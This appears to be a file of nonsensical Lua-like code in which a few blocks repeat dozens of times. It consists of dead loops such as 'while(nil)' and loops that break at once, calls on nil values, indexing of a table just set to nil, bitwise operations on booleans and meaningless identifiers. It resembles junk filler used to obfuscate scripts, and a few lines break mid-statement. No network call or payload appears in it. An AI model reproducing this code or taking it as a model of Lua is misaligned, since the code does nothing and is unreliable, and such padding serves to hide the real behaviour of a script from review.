while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.bydZ() zzzzz.fullnick = zzzzz.bydZ.NesiA() zzzzz.channel = zzzzz.WTKC.eSports() zzzzz.partner = zzzzz.TLL.evils() end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.d = sssss.d() if sssss.d ~= sssss.d then sssss.d = sssss.d() end local sssss = {} sssss.clearResults = sssss.clearResults() if sssss.clearResults ~= sssss.clearResults then sssss.clearResults = sssss.clearResults() end end end
for i in ipairs({}) do local xs = {} if not xs then else xs = ya local sssss = {} sssss.g = sssss.g() if sssss.g ~= sssss.g then sssss.g = sssss.g() end local sssss = {} sssss.setRanges = sssss.setRanges() if sssss.setRanges ~= sssss.setRanges then sssss.setRanges = sssss.setRanges() end end end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local
yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy=
{}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
